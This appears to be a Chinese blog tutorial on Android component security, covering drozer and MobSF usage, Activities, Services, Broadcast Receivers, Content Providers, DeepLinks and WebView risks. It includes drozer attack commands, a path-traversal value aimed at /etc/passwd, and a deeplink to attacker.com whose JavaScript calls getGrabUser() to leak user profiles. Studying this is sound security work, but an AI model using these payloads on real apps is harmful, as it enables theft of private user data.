---
title: Android APP 组件安全入门
date: 2026-02-03 14:40:38
categories: Mobile
tags:
mathjax:
top:
---

## 简介

<img src="/assets/Pasted image 20240827230342.png" alt="Pasted image 20240827230342" style="zoom:50%;" />

安卓 RCE 的核心思想是找到一个可以被远程触发的入口点，并利用这个入口点来执行任意代码。这个过程分为两步：

- 触发点（Trigger）：寻找一个可以被远程控制，且会处理恶意数据的接口。这个接口可以是应用程序的某个功能、某个系统服务，甚至是底层的通信协议
- 代码执行（Execution）：利用触发点，让系统执行攻击者预设的代码。这通常涉及到内存破坏、反序列化、或动态加载恶意代码

安卓RCE的主要利用途径：

**应用层漏洞：**

最常见的 RCE 攻击途径，通常利用的是应用程序自身的逻辑或代码缺陷

- WebView远程代码执行：如果应用使用了 webview 组件，并且没有对其进行安全配置,攻击者可以利用 Javascript 接口或add]avascriptInterface接口来触发漏洞。如果webview加载了恶意网页，恶意Javascript就可以调用本地Java方法,从而实现RCE
- 反序列化漏洞：如果应用使用了不安全的序列化库(如Fastjson、GSON的旧版本)，并且从远程接收不可信的序列化数据，攻击者可以构造恶意Payload，在反序列化时触发RCE
- 动态加载漏洞：如果应用从远程服务器下载jar、dex或其他可执行文件，并对其进行动态加载，攻击者可以控制下载的文件，从而实现RCE

**IPC漏洞：**

安卓系统依赖于各种IPC机制(如Binder、content Provider)来允许不同应用之间进行通信

- Binder 漏洞：安卓的Binder机制是其核心IPC方式。如果一个 Binder服务没有对传入的数据进行严格验证，攻击者可以构造恶意数据,利用 Binder 通信的漏洞，在服务端进程中触发内存破坏或逻辑缺陷，从而实现RCE
- Content Provider 漏洞：如果content provider存在SQL注入或文件路径遍历漏洞，攻击者可以利用这些漏洞，读取或写入敏感文件，甚至触发其他漏洞，最终导致RCE。

常见组件漏洞：

- Android 四大组件安全
- Activity 界面劫持
- Backup 备份安全
- 本地拒绝服务安全
- WebView 远程代码执行安全
- Intent 劫持

## 工具安装

### drozer

```shell
pip3 install drozer
```

然后下载 drozer apk 安装到模拟器或真机。

apk：[drozer-agent](https://github.com/ReversecLabs/drozer-agent/releases/download/3.1.0/drozer-agent.apk)

### MobSF

```shell
docker pull opensecurity/mobile-security-framework-mobsf

#后台方式 + 数据持久化
docker run -d -p 8000:8000 --name MobSF -v /tools/mobile/mobsf_data:/root/.MobSF opensecurity/mobile-security-framework-mobsf
```

然后访问 127.0.0.1:8000 即可。

## 工具使用

### drozer

[Drozer](https://github.com/ReversecLabs/drozer) 提供了一个交互式框架，用于测试 Android 的进程间通信（IPC）机制——即应用程序之间通信和功能暴露的方式。

**为什么 Drozer 在静态分析后很重要**：它显示哪些组件被导出，但不会告诉你它们是否真的存在漏洞。Drozer 允许你与这些组件交互，发送精心设计的输入以触发安全问题。

点击右下角开启服务，默认端口为 31415。

<img src="/assets/Pasted%20image%2020250719183146.png" alt="image" width="50%" style="zoom:50%;" >


然后我们需要设置一个合适的端口转发，以便电脑可以连接到代理在模拟器内部或设备上打开的 TCP 套接字。

```shell
adb forward tcp:31415 tcp:31415
drozer console connect
```

连接成功就会显示以下图标：

<img src="/assets/Pasted%20image%2020250719183205.png" alt="image" width="60%">

常用的测试命令：

- `run MODULE`：执行模块（功能）
- `list`：显示所有可用模块
- `help 命令`：查看帮助
- `run app.package.list -f 应用名`：查看应用的包名
- `run app.package.info -a 包名`：获取包的详细信息
- `run app.package.attacksurface 包名`：检测应用攻击面（导出组件）
- Activity 测试命令
  - `run app.activity.info -a 包名`：扫描 Activity 组件信息
  - `run app.activity.start --component 包名 组件名`：启动某个 Activity，测试是否能绕过认证
- Content Provider 测试命令：
  - `run app.provider.info -a 包名`：扫描 ContentProvider组件信息
  - `run app.provider.query 包名`：查询 ContentProvider，测试是否存在未授权访问或 SQL 注入
  - `run app.provider.query uri的路径`：查询指定 URI 的数据，用于测试未授权读权限。
  - `run scanner.provider.finduris -a 包名`：获取所有可以访问的 URL
  - `run app.provider.download`：下载敏感数据如数据库
  - `run scanner.provider.injection`：测试 ContentProvider 是否存在 SQL 注入
  - `run scanner.provider.traversal -a 包名 `：测试是否存在目录遍历漏洞（FileProvider 逻辑错误等）。
  - `run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts`：文件读取
- Broadcast 测试命令：
  - `run app.broadcast.info -a 包名`：扫描 Broadcast 组件信息
  - `run app.broadcast.send --component 包名 ReceiverName --action android.intent.action.XXX`：含 action 和 extras 的广播。
  - `run app.broadcast.send --component 包名 ReceiverName`：向某个 Receiver 发送广播，无 action。用于越权测试。
  - `run app.broadcast.send --action android.intent.action.XXX`：仅指定 action 不指定组件，用于触发所有匹配该 action 的 Receiver。
  - `run app.broadcast.send --action 广播名 --extra string 参数`
  - `run app.broadcast.send --action 广播名`：向广播组件发送不完整intent，使用空 extras，可以看到应用停止运行。
- Service 测试命令：
  - `run app.service.info -a 包名`：扫描 Services 组件信息
  - `run app.service.start --action 服务名 --component 包名 服务名`：调用服务组件
  - `run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService`

### MobSF

访问进入登陆界面，默认账号密码是 mobsf。

MobSF的检测能力：

**应用安全配置错误：**

- 在生产环境中启用可调试标志（允许运行时作）
- 支持无限制备份（支持数据提取）
- 允许明文流量（暴露通信被窃听）
- 窃听漏洞（可能的UI叠加攻击）

**为什么这些很重要**：每一次配置错误都代表开发者忘记启用的安全控制。可调试应用可以附加到调试工具上，运行时修改，并由攻击者控制其代码执行。

检测到的代码级漏洞：

- 硬编码的秘密（API密钥、密码、令牌）
- 弱随机数生成（可预测的“随机”值）
- SQL 注入向量（未净化数据库查询）
- 路径穿越风险（任意文件访问可能性）
- 不安全的加密实现（已弃用算法，密钥较弱）
- [WebView](https://play.google.com/store/apps/details?id=com.google.android.webview&hl=en&pli=1) 安全问题（JavaScript 界面暴露，文件访问）

**隐私与数据保护问题**：

- 超出应用功能的权限请求
- 未加密的敏感数据存储
- 日志声明中泄露的个人信息
- 不安全的进程间通信

**第三方库漏洞**：

MobSF会对所有包含的库进行CVE数据库扫描，标记已知漏洞。这尤其有价值，因为开发者很少更新依赖——应用通常附带包含公开已知漏洞的库。

示例发现：“应用使用 OkHttp 3.12.0，包含 CVE-2021-0341，允许证书验证绕过。”

**依赖扫描的重要性**：利用已知漏洞所需的技能极少。存在公开漏洞。如果应用使用了易受影响的库版本，你通常可以复制概念验证，并立即展示其影响力。

MobSF 可以进行静态分析和动态分析。

上传测试 APP。

- 静态分析：

通过网页界面上传你的APK。MobSF 会自动提取、反编译和分析所有内容。审查生成报告，发现按严重程度组织。

<img src="/assets/Pasted%20image%2020250820080522.png" alt="image" width="80%">



- 动态分析

除了静态分析外，MobSF 还通过使用 Frida 进行运行时分析：

- 配置你的root设备或模拟器
- 将MobSF连接到设备
- 从网页界面启动动态分析
- 动态模式捕捉：
- 所有网络流量（已联系的终端，传输的数据）
- 运行时行为（哪些组件被激活，它们的作用）
- 文件系统作（创建、修改、访问的文件）
- 对敏感系统功能的 API 调用

## 基础知识

### 四大组件

Android 系统四大组件分别是活动（Activity）、服务（Service）、广播接收器（Broadcast Receiver）和内容提供器（Content Provider）。其中活动是所有 Android 应用程序的门面，凡是在应用中你看到的东西，都是放在活动中的。而服务就比较低调了，你无法看到它，但它会一直在后台默默地运行，即使用户退出了应用，服务仍然是可以继续运行的。广播接收器允许你的应用接收来自各处的广播消息，比如电话、短信等，当然你的应用同样也可以向外发出广播消息。内容提供器则为应用程序之间共享数据提供了可能，比如你想要读取系统电话本中的联系人，就需要通过内容提供器来实现。

每个 Android 应用都由 **Activity、Service、Content Provider 和 Broadcast Receiver** 构成，这些是 Android 的基本组件。其中，Activity 是应用的主体部分，负责大部分的界面显示与交互。甚至在某种意义上说，一个“界面”就是一个 Activity。

Activity 是用户可见的界面，用户可以在其上进行交互。例如，一个 Activity 可以显示供选择的菜单列表，或者含有描述的图片。短信应用可能包含：

- 一个 Activity 显示联系人列表让用户选择收件人
- 一个 Activity 用于编写短信
- 一个 Activity 用于查看历史消息或设置

这些 Activity 共同组成一个应用界面，但它们都是独立存在的，每一个都是基于 Activity 父类实现的子类。

一个应用可以包含多个 Activity，数量和功能由应用设计决定。通常应用都会有一个作为启动入口的 Activity。当需要跳转到其他 Activity 时，会启动另一个 Activity。

当多个 Activity 能响应同一个 Action 时，系统会弹出一个选择器供用户选择要使用的 Activity。

权限：`android:exported`

该属性表示一个 Activity 是否允许被外部应用启动：

- `true`：允许外部应用启动
- `false`：只能由自身应用启动（或同 UID / root）

默认行为：

- 没有配置 intent-filter → exported 默认 false。因为没有过滤器，只能通过显式类名启动，多数情况下只会自身启动。
- 配置了 intent-filter → exported 默认 true

因此 exported 主要用于控制 Activity 是否暴露给外部应用。

此外，还可以通过权限声明进一步限制外部应用是否能够启动 Activity。

### Intent

"声明做某事的意图，并让 Android 找出可以处理它的应用程序”

Intent 是四大组件之间通信的载体，使用场景如下：

- Activity：启动界面；
- Service：启动或绑定服务；
- Broadcast Recevier：发送广播；
- Content Provider：通过 `ContentResolver` 间接访问。

启动 Activity（活动）

Activity 负责呈现应用程序的屏幕界面。所以，如果你的应用有多个界面，你可以使用`startActivity()`来启动另一个 activity。为此，你需要创建一个`Intent`对象并指定要启动的 activity 类。

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.activitiestest","io.hextree.activitiestest.SecondActivity"));
startActivity(intent);
```

还有一种替代的语法方式可以指定目标的包名和 activity 类名：

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.activitiestest","io.hextree.activitiestest.SecondActivity");
startActivity(intent);
```

一个应用总是可以启动自己内部的 activity，但如果你想让其他应用启动你的某个 activity，该 activity 必须是 exported 的（即 `android:exported="true"`）。另外，默认会有一个 exported 的 activity，这就是所谓的 launcher activity —— 它是进入应用的主入口，使得用户点击图标时主屏幕或启动器能够启动你的应用。

传入的 Intent

启动 activity 时使用的 intent 对象，应用可以通过`getIntent()`获取。这个特性通常用于**向其他应用传递数据**，因此它成为了一个重要的攻击面 —— 应用是否能**安全地处理传入的 intent**，是非常关键的安全问题。

搜索意图处理：

- `getIntent()`
- `onNewIntent`
- `getExtras`
- `getStringExtra`

intent 是安卓的应用间通信机制。当应用处理意图却未验证数据时，攻击者可以注入恶意输入。

脆弱模式示例：

```java
Intent intent =getIntent();
String url = intent.getStringExtra("url");
webView.loadUrl(url);
```

这会加载其他应用提供的URL——无需验证。攻击者发送带有`URL = “file:///data/data/com.target.app/databases/users.db”`的意图并窃取数据库。

另一个例子：

```java
String filePath = intent.getStringExtra("filepath");
File file =newFile(filePath);
FileInputStream fis =newFileInputStream(file);
```

这会造成路径穿越的脆弱性。提供像`../../../../etc/passwd`这样的文件路径，你就可以读取任意文件。

### Android Binder

Android Binder 是一个 Linux 内核驱动程序，用于将 Intent 从一个应用传输到另一个应用

功能：

- 在不同进程之间传递对象（如 Intent）；
- 调用远程服务。

Intent 是请求载体，四大组件是目标，Binder 是跨进程调度通道。

启动流程示意（Activity 为例）

```
[应用层]
Activity A调用startActivity(intent)
        │
        ▼
[Framework 层]
ActivityManager (Java) ——封装——> Binder Proxy
        │
        ▼
[系统服务层]
ActivityManagerService (system_server) ——Binder IPC——>目标应用进程
        │
        ▼
[应用层]
ActivityThread 创建 Activity
Activity onCreate() 获取 Intent
```

## 四大组件安全

### Activity

当一个 Activity 被启动的时，它会按照以下流程依次调用不同的方法，直到生命周期结束。

Activity 创建时所要执行的方法：

- `Create()`：每个活动中我们都重写了这个方法，它会在活动第一次被创建的时候调用。我们在这个方法中完成活动的初始化操作，比如说加载布局、绑定事件等。
- `Start()`：这个方法在活动由不可见变为可见的时候调用，即 Activity 被显示到屏幕上的时候调用此方法。
- `Resume()`：这个方法在活动准备好和用户进行交互的时候调用。此时的活动一定位于返回栈的栈顶，并且处于运行状态，即能够获得用户的焦点之前调用此方法。

| 函数名称    | 描述                                                         |
| ----------- | ------------------------------------------------------------ |
| onCreat()   | 一个 Acitivity 启动后第一个被调用的函数，常用来在此方法中进行 Acitivity 的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。 |
| onStart()   | 当 Acitivity 显示在屏幕上                                    |
| onResume()  | 这个方法在onStart()之后调用，也就是在Acitivity准备好与用户进行交互的时候调用，此时的Acitivity一定位于Acitivity栈顶，处于运行状态。 |
| onPause()   | 这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。 |
| onDestroy() | 这个方法是在Activity销毁之前调用，之后Activity的状态为销毁状态。 |
| onRestart() | 当Activity从停止stop状态恢复进入start状态时调用状态。        |

Activity 销毁时所要执行的方法：

- `onPause()`：这个方法在系统准备去启动或者恢复另一个活动的时候调用。当第一个 Activity 通过 Intent 启动第二个Activity的时候，将调用第一个 Activity 的`onPause()`方法。然后调用第二个 Activity 的`onCreate()`、`onStart()`、`onResume()`方法，接着调 用第一个Activity 的`onStop()`方法。如果第一个 Activity 重新获得焦点,则将调用`onResume()`方法；如果第一个 Activity 进入用户不可见状态，那么将调用`onStop()`方 法。
- `onStop()`：这个方法在活动完全不可见的时候调用，即当第一个 Activity 被第二个 Activity 完全覆盖,或者被销毁的时候回调用此方法。它和`onPause()`方法的主要区别在于， 如果启动的新活动是一个对话框式的活动，那么`onPause()`方法会得到执行，而 onStop()方法并不会执行。
- `onDestroy()`：这个方法在活动被销毁之前调用，之后活动的状态将变为销毁状态，或 者是调用`finish()`方法结束 Activity 的时候调用此方法。可以在此方法中进行收尾工作， 比如释放资源等。
- `onRestart()`：这个方法在活动由停止状态变为运行状态之前调用，接着将调用`onStart()`方 法，也就是活动被重新启动了



“活动是用户可以做的单一的、有针对性的事情。几乎所有活动都与用户交互，因此 Activity 类负责为您创建一个窗口，您可以在其中放置 UI”

为了攻击一个应用，我们首先需要了解我们**可以与哪些组件进行交互**。这就是为什么我们要查看 `AndroidManifest.xml`，并查找任何带有 `android:exported="true"` 属性的 `<activity>`。

至于**这个属性是如何使我们能够攻击某个 activity 的**，我们将在接下来的内容中进一步学习。


显式打开Activity通过putExtra和getStringExtra传参

隐式Intent打开Activity只有`<action>`和`<category>`中的内容能够匹配上Intent中指定的action和category时，这个活动才能响应Intent，1个action n个catagory

隐式Intent通过Uri.parse打开程序外Activity，需在`<intent-filter>`中配置`<data>`标签里的特定协议

通过Intent向下一个Activity传递数据，也可以通过startActivityForResult()来启动活动，该方法在活动销毁时能返回一个结果给上一个活动；当活动销毁后，就会回调到上一个活动，需要用onActivityResult接收

Activity生命周期

Activity启动模式：standard模式、singleTop模式、singleTask模式、singleInstance模式

**越权绕过**

如果设置exported = "true" 或者Android12以下不设置exported属性就会默认true

```
adb forward tcp:31415 tcp:31415
run app.activity.start --component com.example.login
com.example.login.SuccessActivity
```

只添加了`<intent-filter>`的属性，有`<intent-filter>`的 Activity 默认就是导出的

```xml
<activity android:name=".SensitiveActivity">
    <intent-filter>
        <action android:name="com.example.SENSITIVE_ACTION" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

先用adb启动：adb shell am start -n com.victim.app/.SensitiveActivity或者adb shell am start -a com.example.SENSITIVE_ACTION

```java
Intent intent = new Intent();
intent.setAction("com.example.SENSITIVE_ACTION");
// 可以添加额外数据欺骗参数
intent.putExtra("cmd", "leak_sensitive_data");
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
context.startActivity(intent);
```

**Activity劫持**

```shell
run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity
```

**拒绝服务**

通用型本地拒绝服务漏洞，主要源于攻击者向 Intent 中传入其自定义的序列化类对象，当调用组件收到此 Extra 序列化类对象时，无法找到此序列化类对象的类定义，因此发生类未定义的异常而导致应用崩溃。  

本地拒绝服务漏洞不仅可以导致安全防护等应用的防护功能被绕过或失效（如杀毒应用、安全卫士、防盗锁屏等），而且也可被竞争方应用利用来攻击，使得自己的应用崩溃，造成不同程度的经济利益损失。

1. NullPointerException异常导致的拒绝服务，源于程序没有对getAction()等获取到的数据进行空指针判断，从而导致空指针异常而导致应用崩溃；

```java
Intent i = new Intent(); 
if (i.getAction().equals("NullPointerException")) { 
	Log.d("TAG", "Test"); 
}
```

2. ClassCastException异常导致的拒绝服务, 源于程序没有对getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换，从而导致类型转换异常而导致应用崩溃；

```java
Intent i = getIntent(); 
String test = (String)i.getSerializableExtra("key");
```

3. IndexOutOfBoundsException异常导致的拒绝服务，源于程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小的判断，从而导致数组访问越界而导致应用崩溃；

```java
Intent intent = getIntent(); 
ArrayList&lt;Integer&gt; 
intArray = intent.getIntegerArrayListExtra("id"); 
if (intArray != null) { 
	for (int i = 0; i &lt; NUM; i++) { 
		intArray.get(i); 
	} 
}
```

### Service

Service 适用于处理长期运行或异步处理的任务。如后台播放音乐。

手动调用方法：

- `startService()`：启动服务，执行时 Service 会调用`onCreate->onStartCommand`。
- `stopService()`：关闭服务，执行时直接调用`onDestroy`方法。
- `bindService()`：绑定服务，执行时 Service 会调用`onCreate->onBind`，调用者和 Service 绑定。
- `unbindService()`：解绑服务，执行时 Service 调用`onUnbind->onDestroy`。

自动调用方法：

- `onCreat()`：创建服务，第一次启动 Sercies 时调用。
- `onStartCommand()`：开发服务，第一次启动 Sercies 时在`onCreat()`之后被调用。如果 Service 已经启动过，在我们再次启动 Service 时不会再执行`onCreate()`方法。
- `onDestroy()`：消耗服务，当停止 Service 时则执行此方法。
- `onBind()`：绑定服务
- `onUnbind()`：解绑服务



startService：必须用stopService来结束，不调用会导致Activity结束而Service还运行

bindService：可以由unbindService来结束，也可以在Activity结束之后自动结束

混合：停止服务应同时使用stepService与unbindService

startService分为隐式启动和显式启动，隐式启动分为用Action启动和用包名启动

bindService使用bind通信机制，bindService启动的服务和调用者是典型的client-server模式。调用者是client，service是server端；client可以通过IBinder接口获取Service实例，从而实现在client端直接调用Service，实现灵活交互

- 权限提升

猎豹清理大师内存清理权限泄露漏洞：4.0.1及以下版本存在权限泄漏漏洞，泄露的权限为android.permission.RESTART_PACKAGES，**结束进程**来达到**清理内存**的目的。当没有申请此权限的app向猎豹清理大师发送相应的intent时，便可以结束后台运行的部分app进程

乐phone手机任意软件包安装删除漏洞：通过向**ApkInstaller**服务传递构造好的参数，没有声明任何权限的应用即可达到安装和删除任意Package的行为

- Service劫持

原理：隐式启动services，当存在同名service，先安装应用的services优先级高

- 消息伪造

优酷Android 4.5客户端升级漏洞：升级所需的相关数据如app的下载地址等也是从该序列化数据中获取，发现升级过程未对下载地址等进行判断，因此可以任意指定该地址

- 拒绝服务

同activity。

### Broadcast Recevier

对接收到的广播进行选择处理，想要接收什么样的广播和内部定义的 广播匹配，匹配则进行该做的处理操作，没有匹配则无操作，就比如在玩游戏的同时接收 到短信事件，对此你要做什么操作，是想看短信内容还是不做什么处理继续玩游戏，这就 是广播的用途。

注册广播的分类：

注册广播的分类有两种，一种是在代码中注册，一种是在`androidMainfest.xml`中注册，前者是动态注册，后者是静态注册。创建广播接收器也非常简单，我们只需要创建一个类继承自`BroadCastReceiver`并实现`onReceive()`方法即可。 当广播到来的时候`onReceive()`就会执行，具体的处理逻辑代码写在这个方法中就可以了。 

简单的举例代码如下：

```java
package com.feichen.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class MyReceiver extends BroadcastReceiver {
	private static final String TAG = "MyReceiver";
	@Override
	public void onReceive(Context content,Intent intent){
		String msg = intent.getStringExtra("msg");
		Log.i(TAG,msg);
	}
}
```


在创建完广播接收器之后，还无法正常工作，我们还需要为它注册一个知道得到广播地址 下面介绍两种广播方式。

- 静态注册

静态注册是在`AndroidManifest.xml`文件中配置的这里给`MyReceiver`注册一个广播地址。

```xml
<receiver android:name=".MyReceiver">
	<intnet-filter>
		<action android:name="android.intent.action.MY_BROADCAST">
		<category android:name="android.intent.action.MY_BROADCAST">
	</intnet-filter>
</receiver>
```


配置了好之后，只要是`android.intent.action.MY_BROADCAST`这个地址的广播， `MyReceiver`都能够接收到。注意，这种方式的注册是常驻型的，也就是说当应用关闭后， 如果有广播信息传来，MyReceiver也会被系统调用而自动运行。

- 动态注册

动态注册是在代码中动态指定广播地址并注册。通常是在Activity或Service注册一个广 播，下面来看一下注册的代码：

```java
MyReceiver receiver = new MyReceiver();
IntentFilter filter = new IntentFilter();
filter.addAction("android.intent.action.MY_BROADCAST");
registerReceiver(receiver,filter);s
```

这种注册方式与静态注册相反，不是常驻型的，也就是说广播会跟随程序的生命周期。当 注册完成之后，这个接收者就可以正常工作了。我们可以用以下方式向其发送一条广播：

```java
public void send(View view){
	Intent intent = new Intent("android.intent.action.MY_BROADCAST");
	intent.putExtra("msg","hello receiver.");
	sendBroadcast(intent);
}
```


广播的生命周期：

```
1. 发送广播（调用 sendBroadcast）
        ↓
2. 广播接收者的 onReceive() 被回调执行
        ↓
3. onReceive() 执行完毕后，广播生命周期结束
```

广播的生命周期在十秒左右，如果在`onReceive()`内做超过十秒内的事情，就会报错。每 次广播到来时会重新创建`BroadcastReceiver`对象 , 并且调用`onReceive()`方法 , 执行完以后该对象即被销毁。当`onReceive()`方法在 10 秒内没有执行完毕，Android 会认为该程序无响应。所以在`BroadcastReceiver`里不能做一些比较耗时的操作。所以一般遇到比较耗时的工作，应该发送 intent 给service，由 service 完成。

- 敏感信息泄露

发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了

- 权限绕过

动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等

小米MIUI漏洞：MIUI内置的手电筒软件中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗

- 消息伪造

暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患

百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行**钓鱼欺骗**，盗取用户隐私文件和信息，以**百度云盘APP权限执行任何代码**。百度云盘有一个**广播接收器没有**对消息进行安全**验证**，通过发送恶意的消息，攻击者可以在用户手机通知栏上**推送任意消息**，点击消息后可以**利用webview组件**盗取本地**隐私文件**和执行**任意代码**

- 拒绝服务

传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash

### Content Provider

内容提供者，简单来说就是另外一个应用想要访问此应用中私有的数据库，此应用中提供了一个中间对象来供其他应用访问。

Android 的数据存储方式总共有五种，分别是：Shared Preferences、网络存储、 文件存储、外储存储、SQLite。但我们知道一般这些存储都只在单独的一个应用程序之中达到一个数据的共享，有时我们需要操作其他应用程序的一些数据，例如操作系统里的通讯录，这时我们就可以通过`ContentProvider`来满足我们的需求了。如下图：

常见的几个类：

- `ContentResolver`

在`ContentProvider`的使用过程中，需要借用`ContentResolver`来控制`ContentProvider`所暴露处理的接口，作为代理来间接操作`ContentProvider`以获取数据。 

```java
public abstract ContentResolver getContentResolver();
```

所有继承了`Context`的类，都可以通过`getContentResovler()`方法获取该实例。

- `ContentObserver`

`ContentObserver`是内容观察者，用于观察 URL 引起`ContentProvider`中数据变化和通知外界（即访问该数据访问者）。当`ContentProvider`中的数据发生变化时，就会触发该`ContentObserver`类。

```java
contentResolver.registerContentObserver(uri, notifyForDescendants, observer);
```

适合在需要动态感知数据变化的场景中使用，如联系人变更、短信接受等。

- URL

URL 是统一资源定位符，外界进程通过 URI 来找到对应的 ContentProvider 和其中的数据，再进行数据操作。ContentProvider中的URI有固定格式：

```java
content://<authority>/<path>/<id>
```

示例：

```java
content://com.carson.provider/User/1
```

Intent 和 Activity是 Android 中的基本概念。我们需要理解它们的工作原理，才能在后续寻找漏洞时有所依据。因此，我们将在示例应用中玩转 Intent。

```java
Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://hextree.io/"));
startActivity(browserIntent);
```

上述代码声明了一个 Intent，表示希望以“查看”（`ACTION_VIEW`）的方式打开 URL `https://hextree.io/`。当我们把这个 Intent 对象交给 Android 操作系统时，它会自动判断哪个应用可以处理这个请求。这意味着 Intent 可以用来与其他应用进行交互，这也是它们成为最重要的攻击面之一的原因。

在前面的视频里，我们演示了如何发送一个 Intent。现在让我们来了解接收端：我们的应用如何让其他应用可以调用它？

首先，我们必须将一个 Activity 设置为可导出（exported），这样其他应用才能启动它。通过添加 `intent-filter`，我们还可以声明我们的 Activity 能处理特定的 Intent：

```xml
<!-- AndroidManifest.xml -->
<intent-filter>
    <action android:name="android.intent.action.SEND" />
    <data android:mimeType="text/plain" />
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
```

当其他应用向我们发送 Intent 时，我们可以在 Activity 代码中调用 `getIntent()` 来获取并处理这个 Intent。

- 信息泄露

如果对ContentProvider的权限没有做好控制

可以分析目标程序的provider的进程名和授权的URI，构建一个URI，然后通过contentresolver去读取里面的的列表名信息

- SQL注入漏洞

对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击

- 目录遍历

Content Provider组件实现了openFile()接口，如果没有对访问权限控制和对访问的Uri进行有效判断，利用该接口进行文件目录遍历可以达到访问任意可读文件

```java
ContentProvider.openFile（Uri uri，String mode）
```

- 任意备份功能未禁用
  - 如果设置了 `android:allowBackup="true"`（默认就是），用户数据可以被 ADB 一键导出！
  - 可能泄露 token、密码、用户隐私信息等。

## DeepLink

DeepLink 是一种在网页中启动 APP 的超链接。当用户点击 deeplink 链接时，Android 系统会启动注册该 deeplink 的应用，打开在`Manifest`文件中注册该 deeplink 的 activity。

deeplink 在 APP 中会导致多类漏洞：通过 deeplink 操纵 WebView 造成的远程代码执行、敏感信息泄露、应用克隆、launchAnyWhere等漏洞。

 **Deeplink 未校验 URL → 任意 URL 加载到 WebView**

研究员发现某个 deeplink（screenType=HELPCENTER）允许携带参数：

```
grab://open?screenType=HELPCENTER&page=<attacker url>
```

由于缺少校验：

- 未检查 `page=` 是否是允许的域名
- 未过滤恶意 URL
- 未限制跳转行为（必须明确 allow-list）

于是攻击者只需诱导用户打开一个 deeplink，即可让 App 内置的 WebView 加载任意 URL：

```html
<a href="grab://open?screenType=HELPCENTER&page=https://attacker.com/page2.html">Begin attack!</a>
```

这意味着：

> **攻击者完全控制 WebView 的内容，等价于 XSS。**

------

WebView 暴露 JS 接口 → 安卓 getGrabUser() 可被任意 JS 调用

APK 中发现了：

```java
mWebView.addJavascriptInterface(
    new ZendeskSupportActivity.WebAppInterface(this),
    "Android"
);
```

Android 提供的接口：

```java
@JavascriptInterface
public String getGrabUser() {
    return GsonUtils.toJson(zendeskSupportActivity.getMPresenter().getGrabUser());
}
```

攻击者只需要在自己的 HTML 中执行：

```js
window.Android.getGrabUser()
```

就能获得用户完整个人资料（JSON）。

------

iOS 版本同样暴露 grabUser

研究员在 iOS help 页面找到：

```js
if (Utils.Condition.isIOSApp()) {
    Stores.GrabUser.setGrabUser(window.grabUser);
}
```

并且 Android 场景下：

```js
JSON.parse(Android.getGrabUser());
```

说明两端都支持统一接口。

因此只要页面在 App WebView 打开：

iOS 取得数据：

```js
data = JSON.stringify(window.grabUser)
```

Android 取得数据：

```js
data = window.Android.getGrabUser();
```

也就是说：

> **只要 WebView 能加载任意 URL，两端都能被直接信息泄露攻击。**

利用链

```
[1] Attacker crafts malicious HTML  
    ↓  
[2] Deeplink loads attacker URL in in-app WebView  
    ↓  
[3] WebView exposes JS interface without origin check  
    ↓  
[4] Attacker JavaScript calls native getGrabUser()  
    ↓  
[5] Full sensitive user data leaked
```

## WebView

什么是 WebView？我们可以通过 WebView 加载远程 URL 或显示存储在应用中的 HTML 页面。内部使用 WebKit 渲染引擎来显示网页。它支持前进和后退导航、文本搜索等方法。它有一些不错的功能，比如支持 JavaScript 的使用。

我们在很多场景下会使用 WebView 来显示网页。例如，许多应用为了实现服务器控制，很多结果页面并非本地实现，而是网页。这样做有很多优势，比如界面修改不需要发布新版本，直接在服务器端修改即可。通过网页显示界面时，通常或多或少需要和 Java 代码进行交互，比如网页上的按钮点击事件，我们需要知道按钮点击，或者调用某个方法让网页执行某些操作。为了实现这些交互，我们通常使用 JS，而 WebView 提供了相应的方法，具体使用如下：

```java
mWebView.getSettings().setJavaScriptEnabled(true);  
mWebView.addJavascriptInterface(new JSInterface(), "jsInterface");
```

我们让 WebView 注册了一个名为`"jsInterface"`的对象，然后在 JS 中就可以访问 `jsInterface` 对象，调用它的某些方法，从而实现 JS 与 Java 的交互。

> 在 Android 官方文档中对 **addJavascriptInterface** 的说明是：该方法可以让 JavaScript 控制宿主应用，这是一个强大的功能，但对 API level 为 JELLYBEAN（4.1）或以下的应用存在安全风险，因为 JavaScript 可以通过反射访问注入对象的公共字段。如果 WebView 中包含不受信任的内容，攻击者可能会以宿主应用的权限执行任意 Java 代码。在使用此方法时必须格外小心。

JavaScript 会在 WebView 的私有后台线程上与 Java 对象交互，因此需要注意线程安全。Java 对象的字段是不可访问的。

简单来说，使用 `addJavascriptInterface` 可能会导致安全问题，因为 JS 可能包含恶意代码。一旦 JS 恶意，几乎可以做任何事情。

### 漏洞影响

通过 JavaScript，攻击者几乎可以访问设备上的 SD 卡，甚至是联系人、短信等敏感数据。

具体攻击流程如下：

1. WebView 注入一个 JavaScript 对象，并且当前应用有 SDCard 读写权限，例如 `android.permission.WRITE_EXTERNAL_STORAGE`。
